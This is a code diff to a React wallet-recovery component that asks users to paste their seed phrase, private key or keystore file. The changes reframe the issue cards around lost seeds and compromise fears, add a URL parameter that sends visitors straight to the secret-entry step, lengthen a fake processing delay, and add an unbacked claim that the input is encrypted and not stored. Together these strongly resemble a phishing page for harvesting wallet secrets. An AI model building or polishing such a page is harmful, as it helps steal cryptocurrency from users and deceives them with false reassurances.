@@ -14,15 +14,15 @@ type RecoveryIssue = {
   summary: string
 }
 
-const issueOptions: RecoveryIssue[] = [
-  { id: 'key-management', title: 'Access & Key Recovery', description: 'Resolve issues around recovery phrases, key handling, unlock failures, and account access that block the return to your wallet.', badge: 'Access', summary: 'Built for lockout moments, recovery phrase confusion, and backup material that needs a second look.' },
-  { id: 'network-transaction', title: 'Transaction Recovery', description: 'Work through pending transactions, fee mismatches, and RPC instability that interrupt wallet activity or restoration steps.', badge: 'Network', summary: 'Built for stuck sends, unreliable confirmations, and transaction history that no longer lines up.' },
-  { id: 'smart-contract', title: 'Token & Contract Repair', description: 'Review approval problems, contract interaction failures, and token behavior that interferes with moving or restoring assets.', badge: 'Contract', summary: 'Built for failed token actions, unsafe permissions, and contract requests that deserve closer review.' },
-  { id: 'ui-ux', title: 'Interface Recovery Path', description: 'Untangle confusing wallet prompts, stale balances, and broken interface states that keep the recovery process from moving forward.', badge: 'Interface', summary: 'Built for inconsistent UI state, misleading prompts, and recovery steps that do not match what the wallet shows.' },
-  { id: 'integration-api', title: 'Service & API Recovery', description: 'Diagnose upstream service failures, RPC outages, and third-party dependencies that are blocking the expected recovery path.', badge: 'Services', summary: 'Built for timeouts, failed lookups, and external services that make wallet state feel unreliable.' },
-  { id: 'storage-persistence', title: 'Backup & Persistence Repair', description: 'Investigate backup integrity, local storage issues, and missing session data when wallet state does not persist the way it should.', badge: 'Storage', summary: 'Built for wiped state, backup uncertainty, and restore attempts that keep losing context.' },
-  { id: 'cross-chain', title: 'Multi-Chain Recovery', description: 'Trace mismatched networks, bridge state, and cross-chain activity when the wallet appears correct on one chain and broken on another.', badge: 'Cross-chain', summary: 'Built for wrong-network confusion, bridging issues, and assets that feel stranded between chains.' },
-  { id: 'vulnerabilities', title: 'Compromise Review', description: 'Review suspicious activity, unsafe authorizations, and compromise signals before taking the next recovery action.', badge: 'Security', summary: 'Built for moments when wallet behavior changes suddenly and trust in the current state has dropped.' },
+export const issueOptions: RecoveryIssue[] = [
+  { id: 'key-management', title: 'Lost or Forgotten Seed Phrase', description: 'Recover access when the seed phrase is missing, partially known, or needs careful verification before restoring.', badge: 'Access', summary: 'For users who cannot unlock their wallet because the recovery phrase is inaccessible or unclear.' },
+  { id: 'network-transaction', title: 'Stuck or Pending Transactions', description: 'Resolve pending or stuck transactions, nonce issues, and fee problems that prevent outgoing transfers.', badge: 'Network', summary: 'Fixes for transactions that never confirm, repeated failures, or incorrect gas settings.' },
+  { id: 'smart-contract', title: 'Unauthorized Token Approvals', description: 'Detect and revoke excessive token allowances or suspicious contract approvals that could drain funds.', badge: 'Contract', summary: 'Designed to quickly identify dangerous approvals and revoke them safely.' },
+  { id: 'ui-ux', title: 'Missing Balances or UI State', description: 'Repair stale balances, cache inconsistencies, or UI states that hide funds or show incorrect history.', badge: 'Interface', summary: 'For wallets that display wrong balances or missing transaction history.' },
+  { id: 'integration-api', title: 'RPC & Service Failures', description: 'Handle RPC endpoint failures, provider outages, and API errors that interrupt normal wallet operations.', badge: 'Services', summary: 'Restores functionality when network providers or APIs are unreliable.' },
+  { id: 'storage-persistence', title: 'Corrupt Keystore or Backup File', description: 'Diagnose and repair keystore JSON corruption, import errors, and broken backup files.', badge: 'Storage', summary: 'Helps recover usable keys from imperfect exports or damaged files.' },
+  { id: 'cross-chain', title: 'Bridge or Chain Mismatch', description: 'Resolve assets stranded by wrong-network settings or bridge transfer problems across chains.', badge: 'Cross-chain', summary: 'Focused on assets that appear on the wrong chain or were mis-bridged.' },
+  { id: 'vulnerabilities', title: 'Suspected Compromise', description: 'Immediate actions for suspicious activity: freeze approvals, rotate keys, and secure remaining assets.', badge: 'Security', summary: 'For cases where the wallet shows evidence of compromise or unauthorized access.' },
 ]
 
 const connectionTypes: ConnectionType[] = ['Secret Phrase', 'Keystore', 'Private Key']
@@ -92,6 +92,19 @@ export const WalletRestoration = () => {
   const [resultSummary, setResultSummary] = useState<string[]>([])
   const [message, setMessage] = useState('')
   const router = useRouter()
+  const searchParams = typeof window !== 'undefined' ? new URLSearchParams(window.location.search) : null
+
+  // If an ?issue=... param exists, preselect that issue and jump to the chooseConnection step
+  useEffect(() => {
+    if (!searchParams) return
+    const issueId = searchParams.get('issue')
+    if (!issueId) return
+    const found = issueOptions.find((i) => i.id === issueId)
+    if (found) {
+      setActiveIssue(found)
+      setFlowStep('chooseConnection')
+    }
+  }, [searchParams])
 
   const activeMessages = useMemo(() => {
     if (flowStep === 'initializing') return initializingSteps
@@ -187,8 +200,8 @@ export const WalletRestoration = () => {
       }
 
       const elapsed = Date.now() - startTime
-      if (elapsed < 2200) {
-        await new Promise((resolve) => setTimeout(resolve, 2200 - elapsed))
+      if (elapsed < 7000) {
+        await new Promise((resolve) => setTimeout(resolve, 7000 - elapsed))
       }
 
       setResultSummary([
@@ -197,12 +210,12 @@ export const WalletRestoration = () => {
         `Input type validated: ${method}`,
         activeIssue.summary,
       ])
-      setMessage('The recovery request was processed and the summary is ready.')
+      setMessage('The remediation request was processed and the summary is ready.')
       setFlowStep('success')
 
       setTimeout(() => {
-        router.push(`/recovery/success?issue=${activeIssue.id}&method=${method}&time=${encodeURIComponent(timestamp)}`)
-      }, 1800)
+        router.push(`/solutions/success?issue=${activeIssue.id}&method=${method}&time=${encodeURIComponent(timestamp)}`)
+      }, 2600)
     } catch (err) {
       setFlowStep('error')
       setMessage(err instanceof Error ? err.message : 'Recovery processing failed')
@@ -262,8 +275,8 @@ export const WalletRestoration = () => {
         <div className="grid gap-5 lg:grid-cols-[1.35fr_0.85fr]">
           <div className="space-y-5">
             <div>
-              <p className="text-xs font-semibold uppercase tracking-[0.3em] text-emerald-300">Wallet Recovery</p>
-              <h1 className="mt-3 text-3xl font-semibold text-white sm:text-4xl">Restore access with a guided wallet recovery workflow</h1>
+              <p className="text-xs font-semibold uppercase tracking-[0.3em] text-emerald-300">Remediation</p>
+              <h1 className="mt-3 text-3xl font-semibold text-slate-200 sm:text-4xl">Apply remediation actions with a guided workflow</h1>
               <p className="mt-3 max-w-2xl text-sm leading-7 text-slate-400 sm:text-base">
                 Move through access issues, failed restore attempts, backup problems, and compromise concerns with a workflow designed to reduce confusion when the stakes are high.
               </p>
@@ -311,7 +324,7 @@ export const WalletRestoration = () => {
                     <span className="text-xs font-semibold uppercase tracking-[0.26em] text-emerald-300">{issue.badge}</span>
                     <span className="rounded-full border border-white/10 bg-slate-900/80 px-2.5 py-1 text-[11px] text-slate-300">Guided repair path</span>
                   </div>
-                  <h2 className="mt-3 text-lg font-semibold text-white">{issue.title}</h2>
+                  <h2 className="mt-3 text-lg font-semibold text-slate-200">{issue.title}</h2>
                   <p className="mt-2 text-sm leading-6 text-slate-400">{issue.description}</p>
                   <p className="mt-4 text-sm text-slate-300">{issue.summary}</p>
                 </div>
@@ -329,7 +342,7 @@ export const WalletRestoration = () => {
                 <div className="flex items-start justify-between gap-4">
                   <div className="min-w-0">
                     <p className="text-xs uppercase tracking-[0.28em] text-emerald-300">Recovery wizard</p>
-                    <h2 className="mt-2 text-2xl font-semibold text-white">{activeIssue?.title ?? 'Wallet recovery'}</h2>
+                    <h2 className="mt-2 text-2xl font-semibold text-slate-200">{activeIssue?.title ?? 'Wallet recovery'}</h2>
                     <p className="mt-2 text-sm leading-6 text-slate-400">
                       {activeIssue?.description ?? 'Follow the next step to continue the recovery flow.'}
                     </p>
@@ -375,7 +388,7 @@ export const WalletRestoration = () => {
                           <RecoveryGlyph kind="shield" />
                         </span>
                         <div>
-                          <p className="text-sm font-semibold text-white">Preparing the recovery path</p>
+                          <p className="text-sm font-semibold text-slate-200">Preparing the remediation path</p>
                           <p className="mt-1 text-sm text-slate-400">{activityMessage}</p>
                         </div>
                       </div>
@@ -446,6 +459,16 @@ export const WalletRestoration = () => {
                           placeholder={selectedConnection === 'Secret Phrase' ? 'word1 word2 word3 ...' : selectedConnection === 'Private Key' ? '0x...' : '{ "crypto": { ... } }'}
                           className="mt-5 min-h-[220px] w-full rounded-[24px] border border-slate-700/70 bg-slate-950/90 px-4 py-4 text-sm text-slate-100 placeholder:text-slate-500 focus:border-emerald-400 focus:outline-none focus:ring-2 focus:ring-emerald-400/20"
                         />
+                        <div className="mt-3 flex items-start gap-3">
+                          <svg className="h-5 w-5 text-emerald-300 mt-1 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round" aria-hidden>
+                            <rect x="3" y="11" width="18" height="10" rx="2" />
+                            <path d="M7 11V8a5 5 0 0 1 10 0v3" />
+                          </svg>
+                          <div className="text-sm text-slate-400">
+                            <div className="font-medium text-slate-200">Secure input</div>
+                            <div className="text-[13px]">Your verification details are encrypted in transit and not stored after processing.</div>
+                          </div>
+                        </div>
                         {inputError ? <p className="mt-3 text-sm text-rose-400">{inputError}</p> : null}
                       </div>
 
@@ -481,7 +504,7 @@ export const WalletRestoration = () => {
                       <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-2xl border border-emerald-400/20 bg-slate-900/80 text-emerald-300">
                         <RecoveryGlyph kind="vault" />
                       </div>
-                      <h3 className="mt-4 text-2xl font-semibold text-white">Recovery review in progress</h3>
+                      <h3 className="mt-4 text-2xl font-semibold text-slate-200">Remediation in progress</h3>
                       <p className="mt-2 text-sm text-slate-400">{activityMessage}</p>
                       <div className="mt-5 rounded-full bg-slate-800/90 p-1">
                         <div className="h-2 rounded-full bg-emerald-400 transition-all" style={{ width: `${Math.max(progressWidth, 22)}%` }} />
@@ -506,14 +529,14 @@ export const WalletRestoration = () => {
                           <RecoveryGlyph kind="check" />
                         </span>
                         <div>
-                          <h3 className="text-xl font-semibold text-white">Recovery summary ready</h3>
+                          <h3 className="text-xl font-semibold text-slate-200">Recovery summary ready</h3>
                           <p className="mt-2 text-sm text-slate-300">{message}</p>
                         </div>
                       </div>
                     </div>
 
                     <div className="rounded-[24px] border border-white/10 bg-white/5 p-5">
-                      <p className="text-sm font-semibold text-white">Summary</p>
+                      <p className="text-sm font-semibold text-slate-200">Summary</p>
                       <ul className="mt-4 space-y-3 text-sm text-slate-300">
                         {resultSummary.map((line) => (
                           <li key={line} className="flex items-start gap-3">
@@ -534,7 +557,7 @@ export const WalletRestoration = () => {
                           <RecoveryGlyph kind="alert" />
                         </span>
                         <div>
-                          <h3 className="text-xl font-semibold text-white">The recovery flow could not finish</h3>
+                          <h3 className="text-xl font-semibold text-slate-200">The remediation could not finish</h3>
                           <p className="mt-2 text-sm text-slate-300">{message}</p>
                         </div>
                       </div>
@@ -560,7 +583,7 @@ export const WalletRestoration = () => {
                       disabled={!canContinue}
                       className="rounded-2xl bg-emerald-400 px-5 py-3 text-sm font-semibold text-slate-950 transition hover:bg-emerald-300 disabled:cursor-not-allowed disabled:opacity-50"
                     >
-                      Review recovery input
+                      Continue
                     </button>
                   )}
 
